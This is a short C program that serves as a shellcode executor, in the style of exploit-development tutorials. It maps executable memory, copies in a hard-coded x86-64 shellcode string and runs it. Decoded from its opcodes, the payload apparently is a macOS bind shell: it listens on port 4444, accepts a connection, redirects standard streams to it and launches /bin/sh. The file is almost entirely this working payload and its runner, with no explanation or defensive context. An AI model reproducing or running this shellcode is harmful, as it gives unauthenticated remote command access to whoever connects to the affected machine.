//Jacob Hammack
//Shellcode executor template from: http://www.thexploit.com/sploitdev/testing-your-shellcode-on-a-non-executable-stack-or-heap/

#include <stdio.h>

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
 
int (*sc)();
 
char shellcode[] = "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x61\x4c\x89\xc0\x48\x31\xd2\x48\x89\xd6\x48\xff\xc6\x48\x89\xf7\x48\xff\xc7\x0f\x05\x49\x89\xc4\x49\xbd\x01\x01\x11\x5c\xff\xff\xff\xff\x41\xb1\xff\x4d\x29\xcd\x41\x55\x49\x89\xe5\x49\x83\xc0\x07\x4c\x89\xc0\x4c\x89\xe7\x4c\x89\xee\x48\x31\xd2\x48\x83\xc2\x10\x0f\x05\x49\x83\xc0\x02\x4c\x89\xc0\x4c\x89\xe7\x48\x31\xf6\x48\x83\xc6\x05\x0f\x05\x49\x83\xe8\x73\x4c\x89\xc0\x4c\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05\x49\x83\xc0\x29\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x0f\x05\x48\x39\xf8\x74\x25\x49\x83\xe8\x17\x4c\x89\xc0\x0f\x05\x49\x83\xc0\x48\x4c\x89\xc0\x4c\x89\xe7\x0f\x05\x48\x83\xfe\x02\x48\xff\xc6\x76\xef\x49\x83\xe8\x1f\x4c\x89\xc0\x49\x83\xe8\x37\x4c\x89\xc0\x48\x31\xd2\x49\xbd\xff\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xed\x08\x41\x55\x48\x89\xe7\x48\x31\xf6\x0f\x05";

 
int main(int argc, char **argv) 
{
 
    void *ptr = mmap(0, strlen(shellcode), PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
 
    if (ptr == MAP_FAILED) 
    {
        perror("mmap");
        exit(-1);
    }
 
    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;
 
    sc();
 
    return 0;
}
